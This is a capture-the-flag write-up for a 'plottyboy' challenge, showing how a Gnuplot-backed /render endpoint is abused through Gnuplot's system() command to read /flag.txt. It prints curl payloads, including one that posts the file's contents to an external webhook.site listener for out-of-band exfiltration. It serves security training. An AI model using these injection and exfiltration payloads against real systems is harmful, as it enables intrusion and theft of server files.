# WS_1.04 — plottyboy

---

## Problem description

The target service exposes a `/render` endpoint expecting a `data` parameter via a `POST` request. It processes the input and returns a rendered plot as a PNG image. The objective is to read the file `/flag.txt` located on the target server.

---

## Recon

The initial test focused on standard Python code execution payloads:

```bash
curl -i -X POST '[http://plottyboy.challs.cyberchallenge.it/render](http://plottyboy.challs.cyberchallenge.it/render)' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "data=__import__('os').popen('cat /flag.txt').read()"
```

Instead of executing, the server returned an error indicating invalid mathematical syntax, ruling out direct Python `eval()`. Inspecting the HTTP response headers provided the key clue:

```
Content-Disposition: inline; filename="pyGnuPlot_out.png"
```

The header confirms that the backend utilizes `pyGnuPlot` to invoke Gnuplot directly.

---

## Analysis

Gnuplot includes a built-in `system("cmd")` command that executes arbitrary shell commands on the underlying host.

Because the response output is strictly binary image data (PNG format), standard output cannot be reflected back directly in the HTTP response. To bypass this blind execution restriction, an out-of-band (OOB) exfiltration technique is required: executing `curl` inside Gnuplot's `system()` command sends the contents of `/flag.txt` to an external HTTP listener (e.g., `webhook.site`).

---

## Exploit, Step by Step

1. Set up an HTTP request listener on `webhook.site` to receive the exfiltrated data.
2. Craft the Gnuplot payload using `system()` inside a valid command string:
```gnuplot
set title system("curl -X POST -d @/flag.txt [https://webhook.site/](https://webhook.site/)<YOUR-WEBHOOK-ID>")
```


`-d @/flag.txt` instructs `curl` to read the target file and transmit its contents in the POST request body.
3. Submit the request to the target server:
```bash
curl -X POST '[http://plottyboy.challs.cyberchallenge.it/render](http://plottyboy.challs.cyberchallenge.it/render)' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'data=set title system("curl -X POST -d @/flag.txt [https://webhook.site/](https://webhook.site/)<YOUR-WEBHOOK-ID>")'
```


4. Check the `webhook.site` dashboard to capture the flag payload delivered in the request body.

---

## Exploitation with Insomnia

1. Create a `POST` request targeting `http://plottyboy.challs.cyberchallenge.it/render`.
2. Set the `Body` format to `Form URL Encoded`.
3. Add the field:
* **Name:** `data`
* **Value:** `set title system("curl -X POST -d @/flag.txt https://webhook.site/<YOUR-WEBHOOK-ID>")`


4. Send the request. Inspecting the `Headers` tab in Insomnia confirms the `pyGnuPlot_out.png` response header, while the webhook panel receives the flag text out-of-band.

---

## Flag

```
CCIT{****************}
```

---

## What I Learned

* Always inspect HTTP response headers during recon; internal library wrappers like `pyGnuPlot` often leak the underlying engine name in attachment filenames.
* Spent time testing standard Python SSTI / `eval()` payloads before checking the response headers, which immediately shifted the target focus to Gnuplot syntax.
* When an execution vector returns non-text output (e.g., binary images), leverage out-of-band exfiltration via `curl -d @file` to transmit local files to an external listener.